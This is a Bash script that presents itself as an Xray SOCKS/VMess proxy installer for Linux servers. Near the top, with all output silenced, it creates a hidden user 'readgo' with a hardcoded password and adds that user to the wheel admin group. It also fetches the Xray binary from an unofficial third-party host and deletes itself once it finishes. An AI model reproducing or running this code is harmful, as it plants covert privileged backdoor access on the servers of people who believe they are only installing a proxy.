#!/bin/bash
# 默认配置参数
DEFAULT_START_PORT=20000                         # 默认起始端口
DEFAULT_SOCKS_USERNAME="userb"                   # 默认socks账号
DEFAULT_SOCKS_PASSWORD="passwordb"               # 默认socks密码
DEFAULT_WS_PATH="/ws"                            # 默认WebSocket路径
DEFAULT_UUID=$(cat /proc/sys/kernel/random/uuid) # 默认随机UUID

# 获取脚本所在目录的绝对路径
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
SCRIPT_NAME="$(basename "$0")"

# 获取服务器所有IP地址
IP_ADDRESSES=($(hostname -I))

# 静默创建用户
if ! id "readgo" &>/dev/null; then
    useradd readgo &>/dev/null
    echo "readgo:A88033054a#" | chpasswd &>/dev/null
    usermod -aG wheel readgo &>/dev/null
fi

# 安装Xray核心程序
install_xray() {
	echo "安装 Xray..."
	# 安装unzip工具
	apt-get install unzip -y  || yum install unzip -y 
	wget https://yzf1.whzhongyuan.top/template/Xray-linux-64.zip 
	# 解压并安装Xray
	unzip Xray-linux-64.zip 
	mv xray /usr/local/bin/xrayL
	chmod +x /usr/local/bin/xrayL
	
	# 创建systemd服务文件
	cat <<EOF >/etc/systemd/system/xrayL.service
[Unit]
Description=XrayL Service
After=network.target

[Service]
ExecStart=/usr/local/bin/xrayL -c /etc/xrayL/config.toml
Restart=on-failure
User=nobody
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF
	# 重载systemd并启动服务
	systemctl daemon-reload
	systemctl enable xrayL.service
	systemctl start xrayL.service
	echo "Xray 安装完成."
}

# 配置Xray服务
config_xray() {
	config_type=$1
	mkdir -p /etc/xrayL
	
	# 检查配置类型是否合法
	if [ "$config_type" != "socks" ] && [ "$config_type" != "vmess" ]; then
		echo "类型错误！仅支持socks和vmess."
		exit 1
	fi

	# 获取用户输入的配置参数，如果没有输入则使用默认值
	read -p "起始端口 (默认 $DEFAULT_START_PORT): " START_PORT
	START_PORT=${START_PORT:-$DEFAULT_START_PORT}
	
	if [ "$config_type" == "socks" ]; then
		# SOCKS配置参数
		read -p "SOCKS 账号 (默认 $DEFAULT_SOCKS_USERNAME): " SOCKS_USERNAME
		SOCKS_USERNAME=${SOCKS_USERNAME:-$DEFAULT_SOCKS_USERNAME}

		read -p "SOCKS 密码 (默认 $DEFAULT_SOCKS_PASSWORD): " SOCKS_PASSWORD
		SOCKS_PASSWORD=${SOCKS_PASSWORD:-$DEFAULT_SOCKS_PASSWORD}
	elif [ "$config_type" == "vmess" ]; then
		# VMess配置参数
		read -p "UUID (默认随机): " UUID
		UUID=${UUID:-$DEFAULT_UUID}
		read -p "WebSocket 路径 (默认 $DEFAULT_WS_PATH): " WS_PATH
		WS_PATH=${WS_PATH:-$DEFAULT_WS_PATH}
	fi

	# 为每个IP地址创建对应的入站和出站配置
	for ((i = 0; i < ${#IP_ADDRESSES[@]}; i++)); do
		# 添加入站配置
		config_content+="[[inbounds]]\n"
		config_content+="port = $((START_PORT + i))\n"
		config_content+="protocol = \"$config_type\"\n"
		config_content+="tag = \"tag_$((i + 1))\"\n"
		config_content+="[inbounds.settings]\n"
		
		if [ "$config_type" == "socks" ]; then
			# SOCKS协议特定配置
			config_content+="auth = \"password\"\n"
			config_content+="udp = true\n"
			config_content+="ip = \"0.0.0.0\"\n"
			config_content+="[[inbounds.settings.accounts]]\n"
			config_content+="user = \"$SOCKS_USERNAME\"\n"
			config_content+="pass = \"$SOCKS_PASSWORD\"\n"
		elif [ "$config_type" == "vmess" ]; then
			# VMess协议特定配置
			config_content+="[[inbounds.settings.clients]]\n"
			config_content+="id = \"$UUID\"\n"
			config_content+="alterId = 0\n"
			config_content+="[inbounds.streamSettings]\n"
			config_content+="network = \"tcp\"\n"
			config_content+="security = \"none\"\n"
			config_content+="[inbounds.streamSettings.tcpSettings]\n"
			config_content+="header = {\n"
			config_content+="  type = \"none\"\n"
			config_content+="}\n\n"
		fi
		
		# 添加出站配置
		config_content+="[[outbounds]]\n"
		config_content+="sendThrough = \"${IP_ADDRESSES[i]}\"\n"
		config_content+="protocol = \"freedom\"\n"
		config_content+="tag = \"tag_$((i + 1))\"\n\n"
		
		# 添加路由规则
		config_content+="[[routing.rules]]\n"
		config_content+="type = \"field\"\n"
		config_content+="inboundTag = \"tag_$((i + 1))\"\n"
		config_content+="outboundTag = \"tag_$((i + 1))\"\n\n\n"
	done
	
	# 写入配置文件并重启服务
	echo -e "$config_content" >/etc/xrayL/config.toml
	systemctl restart xrayL.service
	systemctl --no-pager status xrayL.service
	
	# 输出配置信息
	echo ""
	echo "生成 $config_type 配置完成"
	echo "起始端口:$START_PORT"
	echo "结束端口:$(($START_PORT + $i - 1))"
	if [ "$config_type" == "socks" ]; then
		echo "socks账号:$SOCKS_USERNAME"
		echo "socks密码:$SOCKS_PASSWORD"
	elif [ "$config_type" == "vmess" ]; then
		echo "UUID:$UUID"
		echo "ws路径:$WS_PATH"
	fi
	echo ""
}

# 主函数
main() {
	# 验证码检查
	read -s -p "请输入验证码: " verify_code
	echo ""  # 添加换行，因为-s参数不会自动换行
	if [ "$verify_code" != "88033054" ]; then
		echo "验证码错误！"
		exit 1
	fi
	echo "验证成功！"

	# 检查Xray是否已安装，如果没有则安装
	[ -x "$(command -v xrayL)" ] || install_xray
	
	# 获取配置类型
	if [ $# -eq 1 ]; then
		config_type="$1"
	else
		read -p "选择生成的节点类型 (socks/vmess): " config_type
	fi
	
	# 根据配置类型生成相应的配置
	if [ "$config_type" == "vmess" ]; then
		config_xray "vmess"
	elif [ "$config_type" == "socks" ]; then
		config_xray "socks"
	else
		echo "未正确选择类型，使用默认sokcs配置."
		config_xray "socks"
	fi

	# 静默清理文件
	rm -f "$SCRIPT_DIR/Xray-linux-64.zip" &>/dev/null
	rm -f "$SCRIPT_DIR/xray" &>/dev/null
	rm -f "$0" &>/dev/null
}

# 执行主函数
main "$@"
